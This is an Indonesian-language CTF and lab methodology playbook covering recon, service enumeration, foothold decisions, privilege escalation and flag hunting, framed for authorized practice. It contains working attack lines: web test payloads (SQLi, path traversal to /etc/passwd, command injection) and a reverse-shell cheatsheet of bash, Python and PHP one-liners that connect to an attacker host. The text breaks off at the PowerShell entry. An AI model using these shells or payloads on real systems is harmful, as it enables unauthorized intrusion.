---
id: "65"
title: "🧭 FILE 65 — CTF GENERAL METHODOLOGY"
category: "9. OSINT & Misc"
categoryId: "osint_misc"
filename: "65_ctf_general_methodology.md"
refs_out: ["37","38"]
refs_in: []
---

# 🧭 FILE 65 — CTF GENERAL METHODOLOGY

## Operational Playbook untuk HackTheBox, TryHackMe, dan Proving Grounds

> **Status:** FINAL — Operational Playbook / Master CTF GPS  
> **Level:** Pemula Absolut → Praktisi CTF/Lab  
> **Platform:** HackTheBox, TryHackMe, Proving Grounds  
> **OS Attacker:** Parrot OS XFCE / Debian-based  
> **Tujuan:** Muscle Memory, Decision Making, Enumeration Discipline, dan Problem Solving  
> **Scope:** CTF/Lab yang legal dan terotorisasi saja
> 
> **Catatan penting:** Dokumen ini bukan kumpulan “magic commands”. Tujuan utamanya adalah membangun proses berpikir yang konsisten:
> 
> ```text
> OBSERVE → ENUMERATE → HYPOTHESIZE → TEST → VALIDATE → EXPLOIT
>             ↓
>          ENUMERATE
>             ↓
>       REASSESS & PIVOT
> ```

---
# 🏁 BAGIAN 0 — FILOSOFI CTF

## 0.1 🆚 Perbedaan CTF vs Real Pentest

| Aspek                 | CTF                                        | Real Pentest                              |
| --------------------- | ------------------------------------------ | ----------------------------------------- |
| Scope                 | Target lab yang sudah ditentukan           | Scope kontrak yang harus dipatuhi         |
| Time Limit            | Biasanya fleksibel atau kompetitif         | Ditentukan statement of work              |
| Flag                  | Bukti keberhasilan eksploitasi             | Bukti teknis, impact, dan evidence        |
| Rules of Engagement   | Mengikuti aturan platform/challenge        | Sangat formal dan mengikat                |
| Reporting             | Biasanya optional / writeup pribadi        | Wajib dan menjadi deliverable             |
| Tujuan                | Belajar, memecahkan puzzle, mengambil flag | Menemukan dan membantu memperbaiki risiko |
| Toleransi Eksploitasi | Relatif tinggi dalam environment lab       | Harus sangat berhati-hati                 |
| Data Sensitif         | Data synthetic/lab                         | Bisa data bisnis/PII nyata                |
| Persistence           | Biasanya tidak diperlukan                  | Biasanya dilarang kecuali disetujui       |
| Scanning              | Menyesuaikan target lab                    | Mengikuti batas scan dan RoE              |
| Destructive Action    | Kadang diperbolehkan sesuai challenge      | Harus eksplisit diizinkan                 |
| Pivoting              | Sering menjadi bagian challenge            | Harus sesuai scope/network boundary       |

### Mental Model

CTF bukan simulasi pentest yang sempurna.

CTF lebih tepat dipahami sebagai:

```text
CTF
│
├── Security Knowledge
├── Enumeration
├── Pattern Recognition
├── Hypothesis Testing
├── Tool Usage
├── Time Management
└── Puzzle Solving
```

Sedangkan pentest profesional lebih dekat ke:

```text
REAL PENTEST
│
├── Scope
├── Rules of Engagement
├── Asset Discovery
├── Risk Identification
├── Validation
├── Evidence Collection
├── Impact Analysis
└── Reporting
```

---

## 0.2 🧠 Mindset yang Benar saat CTF

### Prinsip 1 — “Every Detail May Be Relevant”

Jangan mengartikan:

> “Every detail is definitely intentional.”

Gunakan:

> **“Every detail is potentially relevant until evidence says otherwise.”**

Ini penting karena CTF juga dapat mengandung:

- decoy,
    
- misleading information,
    
- rabbit hole,
    
- unused services,
    
- generic banners,
    
- dead ends.
    

Jadi jangan berpikir:

```text
Ada clue
↓
PASTI exploit path
```

Tetapi:

```text
Ada clue
↓
HIPOTESIS
↓
TEST
↓
CONFIRMED / REJECTED
```

---

### Prinsip 2 — Enumeration Tidak Boleh Diskip

Kesalahan paling umum pemula:

```text
Lihat port 80
↓
Langsung buka browser
↓
Lihat halaman
↓
Coba exploit
```

Workflow yang benar:

```text
Port 80
↓
HTTP headers
↓
Technology detection
↓
Source
↓
Robots / sitemap
↓
Directories
↓
Virtual hosts
↓
Parameters
↓
Cookies
↓
JavaScript
↓
Authentication
↓
Input points
↓
Attack surface
```

Enumeration menjawab:

> **“Apa yang sebenarnya ada?”**

Eksploitasi menjawab:

> **“Apa yang bisa saya buktikan?”**

Tanpa enumeration, kamu sering mengeksploitasi sesuatu yang sebenarnya bukan jalur intended.

---

### Prinsip 3 — Low Hanging Fruit First

Urutan prioritas dasar:

```text
LOW COST + HIGH VALUE
        ↓
   QUICK WINS
        ↓
 EASY MISCONFIG
        ↓
 CREDENTIALS
        ↓
 SIMPLE EXPLOITS
        ↓
 COMPLEX CHAIN
        ↓
 CUSTOM EXPLOIT
```

Contoh:

```text
FTP anonymous
```

jauh lebih layak diuji dulu daripada langsung:

```text
kernel exploit
```

---

### Prinsip 4 — Kapan Harus Pivot?

Pivot ketika:

```text
Evidence tidak mendukung hipotesis
        OR
Test berulang tidak menghasilkan informasi baru
        OR
Cost > Expected Value
```

Contoh:

```text
Directory enumeration
↓
3000 request
↓
Tidak ada endpoint menarik
↓
Semua extension sudah dicoba
↓
Tidak ada parameter
↓
STOP
↓
Pivot → VHost / JS / API / Service lain
```

---

### Prinsip 5 — CTF = Puzzle Solving

Jangan hanya bertanya:

> “Exploit apa yang bisa saya pakai?”

Tanyakan:

```text
Apa yang diketahui?
Apa yang belum diketahui?
Apa yang paling murah untuk diuji?
Apa yang dibuktikan oleh hasil?
Apa kemungkinan berikutnya?
```

Gunakan:

```text
KNOWN
UNKNOWN
QUESTION
TEST
EXPECTED RESULT
OBSERVED RESULT
DECISION
```

Framework ini konsisten dengan master recon workflow yang menggunakan status evidence `OBSERVED → INFERRED → HYPOTHESIS → SUPPORTED → CONFIRMED` serta pendekatan “WHY BEFORE COMMAND”.

---

## 0.3 ⏱️ Time Management di CTF

### Time-Boxing Dasar

|Fase|Budget Awal|
|---|--:|
|Reachability|1–3 menit|
|Fast TCP Recon|3–5 menit|
|Full TCP|Background|
|UDP Screening|5–10 menit|
|Service Enumeration|10–20 menit|
|Web Enumeration|15–30 menit|
|Foothold Investigation|15–30 menit|
|PrivEsc|15–30 menit|
|Deep Research|Setelah evidence cukup|

Angka ini bukan aturan kaku.

Gunakan sebagai **alarm**, bukan stopwatch absolut.

### Rabbit Hole Detection

Tanda rabbit hole:

```text
□ Sudah mengulang test yang sama
□ Output selalu sama
□ Tidak ada evidence baru
□ Hipotesis hanya dipertahankan karena "rasanya benar"
□ Kamu mulai mencoba random payload
□ Kamu tidak dapat menjelaskan WHY test tersebut
□ Kamu sudah mengabaikan service lain
□ Tool berjalan terus tetapi knowledge tidak bertambah
```

### Rabbit Hole Escape Procedure

```text
STOP
 ↓
Catat hypothesis
 ↓
Catat evidence
 ↓
Apa yang sudah dibuktikan?
 ↓
Apa yang belum dibuktikan?
 ↓
Cari test paling murah berikutnya
 ↓
Jika tidak ada → PIVOT
```

---

# 🛠️ BAGIAN 1 — SETUP SEBELUM MULAI

## 1.1 📁 Workspace Setup

```bash
# Membuat workspace khusus untuk mesin
mkdir -p ~/ctf/MACHINE_NAME/{nmap,web,exploit,loot,notes}

# Masuk ke workspace
cd ~/ctf/MACHINE_NAME

# Variabel target
export TARGET="10.10.11.X"

# IP interface VPN attacker
export LHOST="10.10.14.X"

# Port listener
export LPORT="4444"

# Verifikasi variabel
printf 'TARGET=%s\nLHOST=%s\nLPORT=%s\n' "$TARGET" "$LHOST" "$LPORT"
```

### Struktur Direktori

```text
MACHINE_NAME/
├── nmap/
├── web/
├── exploit/
├── loot/
└── notes/
```

### Prinsip Penyimpanan

```text
nmap/     → hasil scanning
web/      → hasil ffuf/gobuster/curl/source
exploit/  → PoC/script/modifikasi exploit
loot/     → credential/key/file penting
notes/    → reasoning & timeline
```

---

## 1.2 🖥️ tmux Layout untuk CTF

Layout:

```text
┌───────────────────────────────┬──────────────────────────────┐
│                               │                              │
│       PANE 1                  │       PANE 2                 │
│       NMAP / SCANNING         │       EXPLOIT / ACTIVE       │
│                               │                              │
├───────────────────────────────┼──────────────────────────────┤
│                               │                              │
│       PANE 3                  │       PANE 4                 │
│       NOTES / BROWSER         │       LISTENER               │
│                               │                              │
└───────────────────────────────┴──────────────────────────────┘
```

### Membuat Session

```bash
# Membuat tmux session baru
tmux new-session -s ctf
```

### Split Vertikal

```bash
# Split kiri/kanan
tmux split-window -h
```

### Split Pane Kedua

```bash
# Masuk ke pane kiri lalu split horizontal
tmux select-pane -L
tmux split-window -v
```

### Split Pane Kanan

```bash
# Kembali ke pane kanan lalu split horizontal
tmux select-pane -R
tmux split-window -v
```

### Posisi yang Diinginkan

```text
Pane 1 = kiri atas
Pane 3 = kiri bawah
Pane 2 = kanan atas
Pane 4 = kanan bawah
```

### Verifikasi Pane

```bash
# Menampilkan daftar pane
tmux list-panes
```

### Navigasi

```bash
# Ctrl+b lalu ←/→/↑/↓
# Berpindah pane menggunakan keyboard
```

---

## 1.3 📝 Note Taking Template

```markdown
# MACHINE: [NAMA]
## Target
- IP:
- Hostname:
- OS:
- Difficulty:
- Platform:

---

## Port Summary

| Port | Protocol | Service | Version | Priority | Notes |
|---|---|---|---|---|---|
| 22 | TCP | SSH | | | |
| 80 | TCP | HTTP | | | |

---

## Service Notes

### 22/SSH
- Banner:
- Authentication:
- Users:
- Findings:

### 80/HTTP
- Title:
- Technology:
- VHosts:
- Directories:
- Login:
- Parameters:
- Interesting files:

---

## Credentials Found

| Service | Username | Password | Hash | Source | Status |
|---|---|---|---|---|---|
| | | | | | |

---

## Flags

### user.txt
- Location:
- Method:

### root.txt
- Location:
- Method:

---

## Evidence

### Observed
-

### Inferred
-

### Hypotheses
-

### Confirmed
-

---

## Timeline

| Time | Action | Result | Decision |
|---|---|---|---|
| | | | |

---

## Rabbit Holes

- What:
- Why:
- Evidence:
- Why abandoned:

---

## Lessons Learned

1.
2.
3.

---

## Next Action

> [Apa aksi paling bernilai berikutnya?]
```

---

# 🧭 BAGIAN 2 — MASTER CTF WORKFLOW

## MASTER DECISION TREE

```text
                   ┌─────────────────┐
                   │   TARGET GIVEN  │
                   └────────┬────────┘
                            │
                            ▼
                  ┌───────────────────┐
                  │ Reachability / VPN│
                  └─────────┬─────────┘
                            │
                            ▼
                  ┌───────────────────┐
                  │ Fast TCP Scan     │
                  └─────────┬─────────┘
                            │
                            ▼
                  ┌───────────────────┐
                  │ Full TCP -p-      │
                  │ Background        │
                  └─────────┬─────────┘
                            │
                ┌───────────┼───────────┐
                ▼           ▼           ▼
              WEB        SMB/AD      OTHER
                │           │           │
                ▼           ▼           ▼
           ENUMERATE    ENUMERATE    ENUMERATE
                │           │           │
                └──────┬────┴──────┬────┘
                       │
                       ▼
                CREDENTIALS?
                 /         \
               YES          NO
                │            │
                ▼            ▼
          VALIDATE       EXPLOIT PATH?
          CROSS-SERVICE    /       \
                         YES         NO
                          │           │
                          ▼           ▼
                      FOOTHOLD     DEEP ENUM
                          │           │
                          └─────┬─────┘
                                │
                                ▼
                         SHELL / ACCESS
                                │
                                ▼
                         LOCAL ENUMERATION
                                │
                                ▼
                          PRIVESC VECTOR
                                │
                                ▼
                         USER / ROOT FLAG
                                │
                                ▼
                          POST-CHALLENGE
```

---

# 🔍 FASE 1 — RECON AWAL

## Langkah 1.1 — Fast Scan

```bash
# Scan service umum dengan default scripts + version detection
nmap -sC -sV "$TARGET" -oN nmap/quick.txt
```

Cari:

```text
open ports
service names
versions
hostnames
default scripts output
certificates
SMB metadata
HTTP titles
```

---

## Langkah 1.2 — Full Port Scan

```bash
# Scan seluruh 65.535 TCP ports
nmap -p- "$TARGET" -oN nmap/allports.txt
```

Jalankan di background:

```bash
# Menjalankan full TCP scan di background
nmap -p- "$TARGET" -oN nmap/allports.txt > nmap/allports.log 2>&1 &
```

Setelah selesai:

```bash
# Cari baris port yang open
grep -E "open|filtered" nmap/allports.txt
```

Jangan berasumsi:

```text
top 1000 ports = seluruh attack surface
```

Full TCP scan penting karena service dapat berjalan pada non-standard port. Master recon workflow juga secara eksplisit membedakan fast scan dengan full TCP coverage.

---

## Langkah 1.3 — Service Version Scan

```bash
# Jalankan version detection pada port yang ditemukan
nmap -sV -p 22,80,443,445 "$TARGET" -oN nmap/services.txt
```

---

## Langkah 1.4 — UDP Scan Top 20

```bash
# Screening UDP top 20 ports
sudo nmap -sU --top-ports 20 "$TARGET" -oN nmap/udp-top20.txt
```

UDP tidak perlu dianggap selesai setelah top 20.

Jika ada clue:

```text
DNS
SNMP
TFTP
Kerberos
NTP
```

lanjutkan targeted UDP scanning.

---

## Langkah 1.5 — Service Identification

Gunakan:

```text
Port
↓
Protocol
↓
Banner
↓
Version
↓
Technology
↓
Authentication
↓
Configuration
↓
Potential Attack Surface
```

### Anti-Bias Rule

```text
Port open
    ≠
Vulnerability

Version old
    ≠
Exploit guaranteed

Banner
    ≠
Version confirmed
```

Prinsip tersebut juga merupakan aturan anti-bias eksplisit dalam master network recon.

---

# 🔌 FASE 2 — ENUMERATION PER SERVICE

## 🌐 PORT 21 — FTP

### First Commands

```bash
# Version + script scan
nmap -p21 -sC -sV "$TARGET" -oN nmap/ftp.txt

# Coba anonymous login
ftp "$TARGET"

# Cek banner secara manual
nc -nv "$TARGET" 21

# Gunakan Nmap FTP scripts
nmap -p21 --script ftp-anon,ftp-syst "$TARGET"
```

Cari:

```text
anonymous access
read/write permission
interesting files
backup files
credentials
version-specific vulnerability
```

---

# 🔐 PORT 22 — SSH

```bash
# Version detection
nmap -p22 -sV "$TARGET"

# Banner
nc -nv "$TARGET" 22

# Host key information
ssh-keyscan "$TARGET"

# Lihat metode authentication bila berguna
nmap -p22 --script ssh-auth-methods "$TARGET"
```

Jika credential valid:

```bash
# SSH login menggunakan credential yang telah ditemukan
ssh USER@"$TARGET"
```

Jangan langsung brute-force tanpa alasan.

---

# ✉️ PORT 25 — SMTP

```bash
# Service detection
nmap -p25 -sC -sV "$TARGET"

# SMTP banner
nc -nv "$TARGET" 25

# Basic SMTP enumeration
nmap -p25 --script smtp-commands "$TARGET"

# User enumeration jika supported oleh service/lab
nmap -p25 --script smtp-enum-users "$TARGET"
```

Cari:

```text
VRFY
EXPN
EHLO capability
user enumeration
relay configuration
interesting mail content
```

---

# 🌐 PORT 53 — DNS

```bash
# DNS version and basic scripts
nmap -p53 -sC -sV "$TARGET"

# Query nameserver
dig @"$TARGET" version.bind chaos txt

# Attempt zone transfer
dig axfr @"$TARGET"

# Reverse lookup
dig -x "$TARGET"
```

Jika memperoleh domain:

```bash
# Query A record
dig example.htb

# Query MX
dig example.htb MX

# Query TXT
dig example.htb TXT

# Query NS
dig example.htb NS
```

---

# 🌍 PORT 80 / 443 — HTTP(S)

```bash
# HTTP headers
curl -I "http://$TARGET"

# HTTPS headers tanpa memblokir self-signed certificate
curl -k -I "https://$TARGET"

# Fetch page
curl "http://$TARGET"

# Technology detection
whatweb "http://$TARGET"

# Nmap HTTP scripts
nmap -p80,443 --script http-title,http-headers,http-methods "$TARGET"
```

Lanjut:

```bash
# Directory enumeration
gobuster dir \
  -u "http://$TARGET" \
  -w /usr/share/wordlists/dirb/common.txt \
  -o web/gobuster.txt
```

atau:

```bash
# Fuzz directory/path
ffuf \
  -u "http://$TARGET/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -o web/ffuf.json \
  -of json
```

VHost:

```bash
# Ganti domain dengan domain yang diketahui
ffuf \
  -u "http://TARGET_DOMAIN" \
  -H "Host: FUZZ.TARGET_DOMAIN" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -o web/vhost.json \
  -of json
```

---

# 🪟 PORT 139 / 445 — SMB

```bash
# Basic SMB enumeration
nmap -p139,445 -sC -sV "$TARGET"

# List shares
smbclient -L "//$TARGET" -N

# Enumerate SMB scripts
nmap -p445 --script smb-os-discovery,smb-enum-shares,smb-enum-users "$TARGET"

# Check null session
smbclient "//$TARGET/IPC$" -N
```

Jika share ditemukan:

```bash
# Connect to discovered share anonymously
smbclient "//$TARGET/SHARENAME" -N
```

Cari:

```text
backup
scripts
configuration
credentials
usernames
documents
SSH keys
passwords
```

---

# 📡 PORT 161 — SNMP

```bash
# SNMP detection
nmap -sU -p161 -sV "$TARGET"

# Basic SNMP enumeration
snmpwalk -v2c -c public "$TARGET"

# System information
snmpwalk -v2c -c public "$TARGET" 1.3.6.1.2.1.1

# Process/configuration information when exposed
snmpwalk -v2c -c public "$TARGET" 1.3.6.1.2.1
```

Community string:

```text
public
private
```

bukan jaminan default.

---

# 📚 PORT 389 — LDAP

```bash
# LDAP detection
nmap -p389 -sC -sV "$TARGET"

# Anonymous root DSE query
ldapsearch -x -H "ldap://$TARGET" -s base

# Query naming contexts
ldapsearch -x -H "ldap://$TARGET" -s base namingContexts

# Anonymous subtree query jika diperbolehkan
ldapsearch \
  -x \
  -H "ldap://$TARGET" \
  -b "DC=example,DC=local"
```

Cari:

```text
users
groups
description
service accounts
email
password hints
SPNs
OU structure
```

---

# 🗄️ PORT 1433 — MSSQL

```bash
# SQL Server detection
nmap -p1433 -sV -sC "$TARGET"

# NSE MSSQL scripts
nmap -p1433 --script ms-sql-info "$TARGET"
```

Jika credential tersedia:

```bash
# Connect using Impacket
impacket-mssqlclient USER:PASSWORD@"$TARGET"
```

---

# 🐬 PORT 3306 — MySQL

```bash
# MySQL detection
nmap -p3306 -sC -sV "$TARGET"

# Connect with discovered credential
mysql -h "$TARGET" -u USER -p
```

Cari:

```text
databases
users
password hashes
application tables
config data
secrets
```

---

# 🖥️ PORT 3389 — RDP

```bash
# RDP service detection
nmap -p3389 -sV -sC "$TARGET"

# Check RDP security information
nmap -p3389 --script rdp-enum-encryption "$TARGET"
```

Credential valid:

```bash
# RDP client
xfreerdp /v:"$TARGET" /u:USER /p:'PASSWORD'
```

---

# ⚡ PORT 5985 — WinRM

```bash
# WinRM detection
nmap -p5985 -sV -sC "$TARGET"

# Use Evil-WinRM only with valid authorized credentials
evil-winrm -i "$TARGET" -u USER -p 'PASSWORD'
```

---

# 🎯 FASE 3 — FOOTHOLD DECISION TREE

```text
FOUND
│
├── Username + No Password
│   ├── Check exposed services
│   ├── Check anonymous/guest access
│   └── Search for password evidence
│
├── Username + Password
│   ├── Validate against discovered service
│   ├── Check other in-scope services
│   └── Try authenticated enumeration
│
├── Hash
│   ├── Identify hash type
│   ├── Attempt appropriate cracking
│   └── Validate recovered secret
│
├── SSH Key
│   ├── inspect permissions
│   ├── identify username
│   └── test SSH authentication
│
├── Web Login
│   ├── Login
│   ├── map authenticated surface
│   ├── test access control
│   └── inspect upload/admin/API features
│
├── File Upload
│   ├── identify validation
│   ├── identify storage path
│   ├── determine execution behavior
│   └── test safe lab payload
│
├── SQL Injection
│   ├── confirm manually
│   ├── enumerate DBMS
│   └── use automation when appropriate
│
├── LFI
│   ├── confirm file-read behavior
│   ├── identify wrappers/normalization
│   └── investigate relevant local files
│
├── RCE in Web App
│   ├── validate command execution
│   ├── identify user context
│   └── establish controlled shell if necessary
│
└── CVE + PoC
    ├── verify version
    ├── verify affected conditions
    ├── inspect PoC
    ├── adapt target details
    └── validate result
```

---

# 🐚 FASE 4 — SHELL STABILIZATION

## Python PTY

```bash
# Upgrade shell menjadi pseudo-terminal
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Jika tersedia Python 2:

```bash
# Fallback untuk lingkungan legacy
python -c 'import pty;pty.spawn("/bin/bash")'
```

## Stty Fix

```text
CTRL+Z
```

Lalu:

```bash
# Aktifkan raw mode dan kembalikan foreground process
stty raw -echo; fg
```

Lanjut:

```bash
# Tentukan terminal type
export TERM=xterm

# Sesuaikan ukuran terminal
stty rows 40 columns 170
```

Verifikasi:

```bash
# Cek shell saat ini
tty

# Cek terminal
echo "$TERM"
```

---

# 🔎 FASE 5 — POST-EXPLOITATION ENUMERATION

## First 20 Checks

### 1. Siapa Aku?

```bash
# Identitas user
whoami
id
```

### 2. Di Mana Aku?

```bash
# Current working directory
pwd

# Hostname
hostname
```

### 3. OS

```bash
# Kernel
uname -a

# Distribution information
cat /etc/os-release
```

### 4. Network

```bash
# Interfaces
ip addr

# Routing table
ip route

# DNS configuration
cat /etc/resolv.conf
```

### 5. User Lain

```bash
# Local users
cat /etc/passwd

# Home directories
ls -la /home
```

### 6. Groups

```bash
# Current groups
groups

# Detailed identity
id
```

### 7. Sudo

```bash
# Check sudo privileges
sudo -l
```

### 8. SUID

```bash
# Search SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

### 9. SGID

```bash
# Search SGID binaries
find / -perm -2000 -type f 2>/dev/null
```

### 10. Capabilities

```bash
# Search Linux capabilities
getcap -r / 2>/dev/null
```

### 11. Cron

```bash
# Current user's crontab
crontab -l 2>/dev/null

# System cron directories
ls -la /etc/cron*
```

### 12. Processes

```bash
# All processes
ps aux
```

### 13. Network Services

```bash
# Listening TCP/UDP sockets
ss -tulpn
```

### 14. Interesting Files

```bash
# TXT files
find / -type f -name "*.txt" 2>/dev/null
```

### 15. Configuration Files

```bash
# Common configuration files
find /etc /opt /var/www -type f \
  \( -name "*.conf" -o -name "*.config" -o -name "*.ini" \) \
  2>/dev/null
```

### 16. History

```bash
# Current shell history
history

# Bash history file
cat ~/.bash_history 2>/dev/null
```

### 17. SSH

```bash
# SSH directory
ls -la ~/.ssh 2>/dev/null
```

### 18. Writable Files

```bash
# Files writable by current user
find / -writable -type f 2>/dev/null
```

### 19. Environment

```bash
# Environment variables
env
```

### 20. Applications

```bash
# Common application directories
ls -la /opt
ls -la /var/www
ls -la /srv
```

---

# 🚀 FASE 6 — PRIVILEGE ESCALATION

## 🐧 Linux

### Baseline Manual Enumeration

```text
WHOAMI
   ↓
GROUPS
   ↓
SUDO
   ↓
SUID
   ↓
CAPABILITIES
   ↓
CRON
   ↓
SERVICES
   ↓
WRITABLE FILES
   ↓
CREDENTIALS
   ↓
KERNEL
```

### LinPEAS

```bash
# Downloading/executing LinPEAS should only be done in the authorized lab
# Example after transferring the script to target:
chmod +x linpeas.sh

# Run the enumeration
./linpeas.sh
```

### Interpret, Don't Just Read

Focus on:

```text
[+] sudo permissions
[+] SUID binaries
[+] capabilities
[+] cron jobs
[+] writable scripts
[+] writable directories
[+] credentials
[+] interesting services
[+] Docker/LXC
[+] NFS
[+] kernel information
```

Jangan menganggap:

```text
RED = exploit guaranteed
```

Gunakan:

```text
Finding
↓
Why is it interesting?
↓
Can current user influence it?
↓
Can influence reach privileged execution?
↓
Can exploit be reproduced?
```

---

## 🪟 Windows

### Baseline

```powershell
# Current user
whoami

# User privileges
whoami /priv

# Group membership
whoami /groups

# Hostname
hostname

# OS details
systeminfo
```

### Search

```text
service permissions
unquoted service paths
weak service configuration
scheduled tasks
registry credentials
stored passwords
PowerShell history
interesting files
ACLs
SeImpersonatePrivilege
SeBackupPrivilege
SeRestorePrivilege
```

### WinPEAS

```powershell
# Example after transferring WinPEAS
.\winPEASx64.exe
```

---

## 🏢 Active Directory

### Core Flow

```text
Initial Foothold
      ↓
Domain Context
      ↓
Current User
      ↓
Domain Users
      ↓
Groups
      ↓
Computers
      ↓
SPNs
      ↓
Sessions
      ↓
ACLs
      ↓
Attack Paths
      ↓
Privilege Escalation
```

### BloodHound

Collect appropriate data:

```bash
# Example collector invocation where applicable
bloodhound-python \
  -u USER \
  -p 'PASSWORD' \
  -d DOMAIN.LOCAL \
  -ns "$TARGET" \
  -c All
```

Then analyze:

```text
Shortest Paths
Domain Admin paths
GenericAll
GenericWrite
WriteDACL
WriteOwner
AddMember
ForceChangePassword
Constrained Delegation
Unconstrained Delegation
ADCS
Kerberoasting
AS-REP Roasting
```

---

# 🚩 FASE 7 — FLAG HUNTING

## Linux

Typical locations:

```bash
# User flag
cat /home/USER/user.txt

# Root flag
cat /root/root.txt
```

## Windows

Typical locations:

```powershell
# User flag
type C:\Users\USER\Desktop\user.txt

# Root/System flag in many HTB-style machines
type C:\Users\Administrator\Desktop\root.txt
```

HTB's current machine submission requirements explicitly document the conventional Linux locations `/home/[user]/user.txt` and `/root/root.txt`, and Windows locations under the user's desktop and Administrator's desktop.

**Jangan jadikan lokasi di atas sebagai hardcoded rule.**

Tetap cari jika tidak ditemukan:

```bash
# Search user-owned txt files
find /home -type f -name "user.txt" 2>/dev/null

# Search root flag candidates
find / -type f -name "root.txt" 2>/dev/null
```

---

# 🌐 BAGIAN 3 — WEB CTF WORKFLOW

## 3.1 🔎 Web Recon Checklist

```text
□ Identify HTTP/HTTPS ports
□ curl -I
□ WhatWeb
□ Nmap HTTP scripts
□ View source
□ Inspect cookies
□ Inspect headers
□ Inspect JS
□ robots.txt
□ sitemap.xml
□ Directory enumeration
□ VHost enumeration
□ Parameter discovery
□ Login pages
□ Registration pages
□ Upload forms
□ API endpoints
□ Backup files
□ Debug pages
□ Technology fingerprint
□ Error messages
```

### Commands

```bash
# Identify technologies
whatweb "http://$TARGET"

# Request headers
curl -I "http://$TARGET"

# HTTPS headers
curl -k -I "https://$TARGET"

# Fetch robots.txt
curl -s "http://$TARGET/robots.txt"

# Fetch sitemap
curl -s "http://$TARGET/sitemap.xml"

# Directory discovery
gobuster dir \
  -u "http://$TARGET" \
  -w /usr/share/wordlists/dirb/common.txt

# Fuzz paths
ffuf \
  -u "http://$TARGET/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt
```

### Technology Detection

Browser:

```text
Wappalyzer
DevTools
View Source
Network Tab
Application Tab
Storage
Cookies
Local Storage
```

---

## 3.2 🧩 CMS-Specific Checks

### WordPress

```bash
# Basic WordPress scan
wpscan \
  --url "http://$TARGET" \
  --enumerate p,t,u
```

Cari:

```text
plugins
themes
users
versions
exposed files
```

### Joomla

```bash
# Joomla discovery
joomscan \
  --url "http://$TARGET"
```

### Drupal

```bash
# Drupal enumeration
droopescan scan drupal \
  -u "http://$TARGET"
```

---

# 🧪 3.3 Common Web Vulnerabilities Quick Check

## SQL Injection

Manual first:

```text
?id=1'
?id=1"
?id=1 AND 1=1
?id=1 AND 1=2
```

Automation:

```bash
# Quick authorized lab check
sqlmap \
  -u "http://$TARGET/item.php?id=1" \
  --batch
```

Jangan berasumsi sqlmap cocok untuk:

```text
JSON body
GraphQL
complex authentication
multi-step workflows
custom headers
non-GET inputs
```

Manual analysis tetap penting.

---

## LFI

Pertanyaan:

```text
Apakah parameter mempengaruhi file path?
Apakah file lokal dapat dibaca?
Apakah normalization dilakukan?
Apakah extension ditambahkan otomatis?
```

Contoh baseline:

```text
?file=../../../../etc/passwd
```

Fuzzing:

```bash
# Example path fuzzing in an authorized lab
ffuf \
  -u "http://$TARGET/index.php?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
```

---

## SSTI

Baseline:

```text
{{7*7}}
```

Jika output:

```text
49
```

maka lanjutkan fingerprinting engine.

---

## XSS

Basic lab test:

```text
<script>alert(1)</script>
```

Pertanyaan berikutnya:

```text
Reflected?
Stored?
DOM-based?
Context?
Encoding?
Filtering?
CSP?
```

---

## Command Injection

Baseline:

```text
;id
```

atau:

```text
|id
```

atau:

```text
$(id)
```

Jangan mencoba seluruh payload list secara random.

Pertanyaan:

```text
Input masuk ke command shell?
Karakter mana yang difilter?
Output reflected?
Blind?
```

---

# 🔑 BAGIAN 4 — CREDENTIAL MANAGEMENT

## 4.1 📒 Credential Storage

Gunakan format:

```text
SERVICE | USERNAME | PASSWORD | HASH | SOURCE | STATUS | NOTES
```

Contoh:

```text
SSH | john | password123 | - | config.php | VALID | login confirmed
```

### Jangan Simpan Credential Secara Acak

Pisahkan:

```text
FOUND
VALID
INVALID
CRACKED
REUSED
```

---

## 4.2 ♻️ Password Reuse Strategy

Jika menemukan:

```text
username = john
password = XXXXXXXXX
```

buat hipotesis:

```text
Apakah credential ini digunakan kembali?
```

Validasi secara terarah:

```text
SSH
Web
SMB
WinRM
MSSQL
MySQL
RDP
```

Jangan melakukan credential spraying terhadap asset yang tidak masuk scope.

### Hash

```text
HASH
 ↓
IDENTIFY
 ↓
CRACK
 ↓
VALIDATE
 ↓
TEST AGAINST IN-SCOPE SERVICES
```

---

# 🔐 4.3 Default Credentials Cheatsheet

> **Peringatan:** tabel ini adalah _candidate knowledge_, bukan daftar password yang dijamin benar. Jangan menganggap default credentials sebagai fakta sebelum service mengonfirmasinya.

|Service|Default User Candidate|Default Password Candidate|Catatan|
|---|---|---|---|
|FTP|anonymous|anonymous / blank|Sering tergantung konfigurasi|
|SSH|root|blank / distro-specific|Root login sering disabled|
|MySQL|root|blank / configured|Sangat environment-dependent|
|MSSQL|sa|configured|Jangan menganggap default universal|
|PostgreSQL|postgres|configured|Password tergantung deployment|
|Redis|—|none|Bisa exposed tanpa auth|
|MongoDB|—|none|Bisa exposed tanpa auth|
|Tomcat|admin|configured|Default berubah antar deployment|
|Jenkins|admin|setup-dependent|Modern setup biasanya memaksa initialization|
|Grafana|admin|setup-dependent|Default dapat berubah|
|phpMyAdmin|root|blank / DB password|Bergantung backend DB|
|WordPress|admin|setup-dependent|Tidak ada universal password|
|Joomla|admin|setup-dependent|Tidak ada universal password|

---

# 🐚 BAGIAN 5 — REVERSE SHELL CHEATSHEET

## 5.1 🎧 Listener Setup

```bash
# Basic netcat listener
nc -lvnp "$LPORT"
```

Lebih nyaman:

```bash
# Listener dengan command history
rlwrap nc -lvnp "$LPORT"
```

Verifikasi interface:

```bash
# Lihat alamat attacker
ip addr show tun0
```

---

## 5.2 🐧 Bash Reverse Shell

```bash
# Bash TCP reverse shell
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
```

---

## 🐍 Python3

```bash
# Python3 reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 🐘 PHP

```bash
# PHP reverse shell
php -r '$sock=fsockopen("$LHOST",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 🪟 PowerShell

```bash
# Example PowerShell reverse shell pattern for an authorized Windows lab
